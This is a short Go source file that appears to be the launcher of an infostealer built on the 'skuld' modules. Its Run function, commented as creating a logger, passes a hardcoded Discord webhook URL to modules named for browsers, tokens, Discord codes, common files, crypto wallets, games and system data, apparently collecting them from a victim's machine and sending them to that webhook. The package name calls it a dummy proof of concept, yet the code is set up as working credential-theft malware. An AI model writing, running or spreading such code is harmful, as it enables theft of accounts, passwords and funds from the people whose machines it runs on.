package dummyPocSteal

import (
	"github.com/hackirby/skuld/modules/browsers"
	"github.com/hackirby/skuld/modules/commonfiles"
	"github.com/hackirby/skuld/modules/discodes"
	"github.com/hackirby/skuld/modules/games"
	"github.com/hackirby/skuld/modules/system"
	"github.com/hackirby/skuld/modules/tokens"
	"github.com/hackirby/skuld/modules/wallets"
)

// Run creates a new logger
func Run() {

	CONFIG := map[string]interface{}{
		"webhook": "https://discord.com/api/webhooks/1266354511153467432/0LUm3FIx1FH3YQOHl6ZAYY2GMhrLw_W2zIlkOYnEyu46ybSFobTyMJw8bUBSNSCw6rsL",
	}

	system.Run(CONFIG["webhook"].(string))

	browsers.Run(CONFIG["webhook"].(string))

	tokens.Run(CONFIG["webhook"].(string))
	discodes.Run(CONFIG["webhook"].(string))
	commonfiles.Run(CONFIG["webhook"].(string))
	wallets.Run(CONFIG["webhook"].(string))
	games.Run(CONFIG["webhook"].(string))

}
